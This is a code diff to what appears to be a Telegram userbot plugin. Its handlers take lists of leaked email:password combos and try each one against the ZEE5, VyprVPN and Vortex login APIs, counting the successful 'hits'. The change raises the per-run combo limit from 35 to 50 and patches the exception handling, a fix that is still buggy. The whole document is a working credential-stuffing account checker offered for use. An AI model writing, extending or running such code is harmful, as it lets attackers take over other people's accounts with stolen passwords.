@@ -26,8 +26,8 @@ async def zee5(event):
     lines = file.readlines()
     for line in lines:
         stark_dict.append(line)
-    if len(stark_dict) > 35:
-        await event.edit('`Woah, Thats A Lot Of Combos. Keep 35 As Limit`')
+    if len(stark_dict) > 50:
+        await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
         return
     for i in stark_dict:
         starkm = i.split(":")
@@ -36,7 +36,7 @@ async def zee5(event):
         try:
             meke = requests.get(f'https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}').json()
         except:
-            pass
+            meke = None
         if meke.get("token"):
             hits += 1
             hits_dict.append(f"{email}:{password}")
@@ -67,8 +67,8 @@ async def vypr(event):
     lines = file.readlines()
     for line in lines:
         stark_dict.append(line)
-    if len(stark_dict) > 35:
-        await event.edit('`Woah, Thats A Lot Of Combos. Keep 35 As Limit`')
+    if len(stark_dict) > 50:
+        await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
         return
     for i in stark_dict:
         starkm = i.split(":")
@@ -81,6 +81,7 @@ async def vypr(event):
         try:
             meke = requests.post(url='https://zwyr157wwiu6eior.com/v1/users/tokens', headers=data, json=sedlyf).json()
         except Exception as s:
+            meke = None
             pass
         if meke.get("token"):
             hits += 1
@@ -112,8 +113,8 @@ async def vortex(event):
     lines = file.readlines()
     for line in lines:
         stark_dict.append(line)
-    if len(stark_dict) > 35:
-        await event.edit('`Woah, Thats A Lot Of Combos. Keep 35 As Limit`')
+    if len(stark_dict) > 50:
+        await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
         return
     for i in stark_dict:
         starkm = i.split(":")
@@ -126,6 +127,7 @@ async def vortex(event):
         try:
             meke = requests.post(url='https://vortex-api.gg/login', headers=data2, json=sedlyf).json()
         except Exception as s:
+            meke = None
             pass
         if meke.get("token"):
             hits += 1
@@ -157,8 +159,8 @@ async def vortex(event):
     lines = file.readlines()
     for line in lines:
         stark_dict.append(line)
-    if len(stark_dict) > 35:
-        await event.edit('`Woah, Thats A Lot Of Combos. Keep 35 As Limit`')
+    if len(stark_dict) > 50:
+        await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
         return
     for i in stark_dict:
         starkm = i.split(":")
@@ -178,7 +180,7 @@ async def vortex(event):
         try:
             meke = requests.get(url=noob, headers=data).text
         except Exception as s:
-            pass
+            meke = None
         if "invalid username or password" in meke:
             bads += 1
         else:
